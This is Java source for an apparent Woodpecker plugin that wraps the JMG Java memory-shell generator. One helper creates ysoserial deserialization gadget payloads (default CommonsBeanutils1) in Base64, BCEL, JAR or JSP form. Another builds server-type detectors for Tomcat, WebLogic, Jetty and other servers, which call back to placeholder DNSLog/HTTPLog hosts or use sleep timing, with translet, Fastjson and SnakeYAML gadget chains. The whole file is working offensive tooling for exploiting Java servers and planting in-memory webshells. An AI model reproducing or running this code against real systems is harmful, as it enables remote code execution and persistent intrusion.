package me.gv7.woodpecker.plugin;


import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.extender.generator.ExtenderGenerator;
import jmg.core.util.ClassNameUtil;
import jmg.core.util.CommonUtil;
import me.gv7.woodpecker.tools.misc.SerializeUtil;
import me.gv7.woodpecker.util.JMGResultUtil;
import sun.misc.Unsafe;

import java.io.File;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class ExtenderHelperPlugin implements IHelperPlugin {
    public static IHelperPluginCallbacks callbacks;

    public static IPluginHelper pluginHelper;

    @Override
    public void HelperPluginMain(IHelperPluginCallbacks helperPluginCallbacks) {
        callbacks = helperPluginCallbacks;
        pluginHelper = callbacks.getPluginHelper();
        callbacks.setHelperPluginName("JMG Extender Helper");
        callbacks.setHelperPluginVersion(Constants.JMG_VERSION);
        callbacks.setHelperPluginAutor(Constants.JMG_AUTHOR);
        callbacks.setHelperPluginDescription("Java 内存马生成器 - 探测中间件/序列化封装");
        List<IHelper> helperList = new ArrayList();
        helperList.add(new DetectorHelper());
        helperList.add(new YsoserialHelper());
        callbacks.registerHelper(helperList);
    }

    public static class YsoserialHelper implements IHelper {
        @Override
        public String getHelperTabCaption() {
            return "Ysoserial Payload Generator";
        }

        @Override
        public IArgsUsageBinder getHelperCutomArgs() {
            IArgsUsageBinder binder = ExtenderHelperPlugin.pluginHelper.createArgsUsageBinder();
            List<IArg> list = new ArrayList();

            IArg ysoGadget = ExtenderHelperPlugin.pluginHelper.createArg();
            ysoGadget.setName("yso_gadget");
            ysoGadget.setDefaultValue("CommonsBeanutils1");
            ysoGadget.setDescription("ysoserial gadget");
            ysoGadget.setRequired(true);
            list.add(ysoGadget);

            IArg ysoCmd = ExtenderHelperPlugin.pluginHelper.createArg();
            ysoCmd.setName("yso_cmd");
            ysoCmd.setDefaultValue("class_file:/tmp/woo.class");
            ysoCmd.setDescription("ysoserial command");
            ysoCmd.setRequired(true);
            list.add(ysoCmd);

            IArg formatType = ExtenderHelperPlugin.pluginHelper.createArg();
            formatType.setName("format_type");
            formatType.setType(7);
            List<String> enumFormattType = new ArrayList();
            enumFormattType.add(Constants.FORMAT_BASE64);
            enumFormattType.add(Constants.FORMAT_BIGINTEGER);
            enumFormattType.add(Constants.FORMAT_BCEL);
            enumFormattType.add(Constants.FORMAT_CLASS);
            enumFormattType.add(Constants.FORMAT_JAR);
            enumFormattType.add(Constants.FORMAT_JSP);
            formatType.setEnumValue(enumFormattType);
            formatType.setDefaultValue(Constants.FORMAT_BASE64);
            formatType.setRequired(true);
            formatType.setDescription("自定义输出格式");
            list.add(formatType);

            IArg output_path = ExtenderHelperPlugin.pluginHelper.createArg();
            output_path.setName("output_path");
            output_path.setType(0);
            output_path.setDefaultValue("workdir");
            output_path.setRequired(false);
            output_path.setDescription("自定义输出路径");
            list.add(output_path);

            binder.setArgsList(list);
            return binder;
        }

        @Override
        public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) {
            try {
                AbstractConfig config = new AbstractConfig();
                String ysoGadget = (String) customArgs.get("yso_gadget");
                String ysoCmd = (String) customArgs.get("yso_cmd");
                config.setOutputFormat((String) customArgs.get("format_type"));
                config.setEnabledExtender(true);
                if (customArgs.get("output_path") != null) config.setSavePath((String) customArgs.get("output_path"));
                if (config.getSavePath() == null) config.setSavePath(System.getProperty("user.dir"));
                config.setSavePath(CommonUtil.getFileOutputPath(config.getOutputFormat(), config.getExtenderSimpleClassName(), config.getSavePath()));

                if (ysoCmd.toLowerCase().startsWith("class_file:")) {
                    String classFilePath = ysoCmd.substring("class_file:".length());
                    File file = new File(classFilePath);
                    if (!file.exists() || !file.isFile()) {
                        resultOutput.warningPrintln(ExtenderHelperPlugin.pluginHelper.getThrowableInfo(new Throwable("File does not exist or is not a regular file: " + config.getClassFilePath())));
                        return;
                    }
                }
                Class utilsClass = Class.forName("me.gv7.woodpecker.yso.payloads.ObjectPayload$Utils");
                Field field = Unsafe.class.getDeclaredField("theUnsafe");
                field.setAccessible(true);
                Unsafe unsafe = (Unsafe) field.get(null);
                Object obj = unsafe.allocateInstance(utilsClass);
                Object payload = ((Class) CommonUtil.invokeMethod(obj, "getPayloadClass", new Class[]{String.class}, new Object[]{ysoGadget})).newInstance();
                Object objGadget = CommonUtil.invokeMethod(payload, "getObject", new Class[]{String.class}, new Object[]{ysoCmd});
                byte[] serializedBytes = SerializeUtil.serialize(objGadget);
                config.setExtenderBytes(serializedBytes);
                config.setExtenderBytesLength(serializedBytes.length);
                JMGResultUtil.printResult(resultOutput, config);
            } catch (Exception e) {
                resultOutput.errorPrintln(ExtenderHelperPlugin.pluginHelper.getThrowableInfo(e));
            }
        }
    }


    public static class DetectorHelper implements IHelper {
        public String getHelperTabCaption() {
            return "ServerType Detector";
        }

        public IArgsUsageBinder getHelperCutomArgs() {
            IArgsUsageBinder binder = ExtenderHelperPlugin.pluginHelper.createArgsUsageBinder();
            List<IArg> list = new ArrayList();

            IArg detect_way = ExtenderHelperPlugin.pluginHelper.createArg();
            detect_way.setName("detect_way");
            detect_way.setType(7);
            List<String> enumDetectWay = new ArrayList();
            enumDetectWay.add(Constants.DETECT_DFSECHO);
            enumDetectWay.add(Constants.DETECT_DNS);
            enumDetectWay.add(Constants.DETECT_HTTP);
            enumDetectWay.add(Constants.DETECT_SLEEP);
            detect_way.setEnumValue(enumDetectWay);
            detect_way.setRequired(true);
            detect_way.setDefaultValue(Constants.DETECT_DFSECHO);
            detect_way.setDescription("自定义探测中间件的方式、默认回显");
            list.add(detect_way);

            IArg server_type = ExtenderHelperPlugin.pluginHelper.createArg();
            server_type.setName("server_type");
            server_type.setType(7);
            List<String> enumServerType = new ArrayList();
            enumServerType.add(Constants.SERVER_TOMCAT);
            enumServerType.add(Constants.SERVER_SPRING_MVC);
            enumServerType.add(Constants.SERVER_JETTY);
            enumServerType.add(Constants.SERVER_RESIN);
            enumServerType.add(Constants.SERVER_WEBLOGIC);
            enumServerType.add(Constants.SERVER_WEBSPHERE);
            enumServerType.add(Constants.SERVER_UNDERTOW);
            enumServerType.add(Constants.SERVER_GLASSFISH);
            server_type.setEnumValue(enumServerType);
            server_type.setDefaultValue(Constants.SERVER_TOMCAT);
            server_type.setRequired(true);
            server_type.setDescription("自定义中间件");
            list.add(server_type);

            IArg dnslog_domain = ExtenderHelperPlugin.pluginHelper.createArg();
            dnslog_domain.setName("dnslog_domain");
            dnslog_domain.setType(0);
            dnslog_domain.setRequired(true);
            dnslog_domain.setDefaultValue("xxx.dnslog.cn");
            dnslog_domain.setDescription("自定义 DNSLog 地址");
            list.add(dnslog_domain);

            IArg httplog_url = ExtenderHelperPlugin.pluginHelper.createArg();
            httplog_url.setName("httplog_url");
            httplog_url.setType(0);
            httplog_url.setRequired(true);
            httplog_url.setDefaultValue("http://xxx.httplog.cn");
            httplog_url.setDescription("自定义 HTTPLog 地址");
            list.add(httplog_url);

            IArg sleep_seconds = ExtenderHelperPlugin.pluginHelper.createArg();
            sleep_seconds.setName("sleep_seconds");
            sleep_seconds.setType(0);
            sleep_seconds.setRequired(true);
            sleep_seconds.setDefaultValue("5");
            sleep_seconds.setDescription("自定义延时的秒数");
            list.add(sleep_seconds);

            IArg gadgetType = ExtenderHelperPlugin.pluginHelper.createArg();
            gadgetType.setName("gadget_type");
            gadgetType.setType(7);
            List<String> enumGadgetType = new ArrayList();
            enumGadgetType.add(Constants.GADGET_NONE);
            enumGadgetType.add(Constants.GADGET_JDK_TRANSLET);
            enumGadgetType.add(Constants.GADGET_XALAN_TRANSLET);
            enumGadgetType.add(Constants.GADGET_FJ_GROOVY);
            enumGadgetType.add(Constants.GADGET_SNAKEYAML);
            gadgetType.setEnumValue(enumGadgetType);
            gadgetType.setDefaultValue(Constants.GADGET_NONE);
            gadgetType.setRequired(true);
            gadgetType.setDescription("自定义利用链");
            list.add(gadgetType);

            IArg formatType = ExtenderHelperPlugin.pluginHelper.createArg();
            formatType.setName("format_type");
            formatType.setType(7);
            List<String> enumFormattType = new ArrayList();
            enumFormattType.add(Constants.FORMAT_BASE64);
            enumFormattType.add(Constants.FORMAT_BIGINTEGER);
            enumFormattType.add(Constants.FORMAT_BCEL);
            enumFormattType.add(Constants.FORMAT_CLASS);
            enumFormattType.add(Constants.FORMAT_JAR);
            enumFormattType.add(Constants.FORMAT_JSP);
            enumFormattType.add(Constants.FORMAT_JSP);
            formatType.setEnumValue(enumFormattType);
            formatType.setDefaultValue(Constants.FORMAT_BASE64);
            formatType.setRequired(true);
            formatType.setDescription("自定义输出格式");
            list.add(formatType);

            IArg detector_class_name = ExtenderHelperPlugin.pluginHelper.createArg();
            detector_class_name.setName("detector_class_name");
            detector_class_name.setType(0);
            detector_class_name.setRequired(false);
            detector_class_name.setDescription("自定义探测器类名");
            list.add(detector_class_name);

            IArg output_path = ExtenderHelperPlugin.pluginHelper.createArg();
            output_path.setName("output_path");
            output_path.setType(0);
            output_path.setDefaultValue("workdir");
            output_path.setRequired(false);
            output_path.setDescription("自定义输出路径");
            list.add(output_path);

            binder.setArgsList(list);
            return binder;
        }

        public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) {
            try {
                AbstractConfig config = new AbstractConfig();
                config.setServerType((String) customArgs.get("server_type"));
                config.setDetectWay((String) customArgs.get("detect_way"));
                config.setGadgetType((String) customArgs.get("gadget_type"));
                config.setOutputFormat((String) customArgs.get("format_type"));
                config.setDnsDomain((String) customArgs.get("dnslog_domain"));
                config.setBaseUrl((String) customArgs.get("httplog_url"));
                config.setSleepTime((String) customArgs.get("sleep_seconds"));
                config.setEnabledExtender(true);

                config.setExtenderClassName(ClassNameUtil.getRandomExtenderClassName());
                config.setExtenderSimpleClassName(CommonUtil.getSimpleName(config.getExtenderClassName()));

                if (customArgs.get("detector_class_name") != null)
                    config.setExtenderClassName((String) customArgs.get("detector_class_name"));
                if (customArgs.get("output_path") != null) config.setSavePath((String) customArgs.get("output_path"));
                if (config.getSavePath() == null) config.setSavePath(System.getProperty("user.dir"));
                config.setSavePath(CommonUtil.getFileOutputPath(config.getOutputFormat(), config.getExtenderSimpleClassName(), config.getSavePath()));

                new ExtenderGenerator().makeShell(config);
                JMGResultUtil.printResult(resultOutput, config);
                JMGResultUtil.printExtenderBasicInfo(resultOutput, config);
            } catch (Exception e) {
                resultOutput.errorPrintln(ExtenderHelperPlugin.pluginHelper.getThrowableInfo(e));
            }
        }
    }

}
